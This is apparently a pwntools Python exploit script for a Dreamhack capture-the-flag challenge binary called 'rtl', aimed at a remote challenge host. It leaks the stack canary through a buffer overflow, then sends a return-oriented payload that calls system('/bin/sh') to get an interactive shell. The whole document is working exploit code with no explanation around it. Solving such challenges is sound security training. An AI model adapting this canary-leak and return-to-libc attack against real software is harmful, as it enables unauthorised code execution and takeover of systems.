#!/usr/bin/env python3

from pwn import *

exe = ELF("./rtl", checksec=False)
context.binary = exe

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.DEBUG:
            gdb.attach(p)
    else:
        p = remote("host1.dreamhack.games", 20775)

    return p

def main():
    p = conn()

    input()

    # Leak canary
    p.sendafter(b'Buf: ', b'a'*57)
    p.recvuntil(b'a'*57)
    canary = u64(b'\0' + p.recv(7))
    print("Canary: " + hex(canary))

    # Get shell
    pop_rdi = 0x0000000000400853
    ret = 0x0000000000400285
    payload = b'a'*56 + p64(canary) + b'a'*8 + p64(pop_rdi) + p64(next(exe.search(b'/bin/sh')))
    payload += p64(ret) + p64(exe.sym['system'])
    p.sendafter(b'Buf: ', payload)

    p.interactive()

if __name__ == "__main__":
    main()